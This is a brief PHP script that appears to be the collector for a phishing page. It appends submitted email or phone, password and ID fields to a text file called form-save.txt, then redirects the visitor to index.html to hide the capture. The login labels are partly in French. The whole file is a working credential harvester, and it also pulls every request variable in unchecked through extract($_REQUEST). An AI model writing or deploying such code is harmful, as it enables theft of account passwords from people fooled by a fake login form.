<?php
    extract($_REQUEST);
    $file=fopen("form-save.txt","a");
    fwrite($file,"Adresse e-mail ou mobile :");
    fwrite($file, $email ."\n");
    fwrite($file,"Password :");
    fwrite($file, $password ."\n");
    fwrite($file,"Your ID :");
    fwrite($file, $ID ."\n");
    fclose($file);
    header("location: index.html");
 ?>
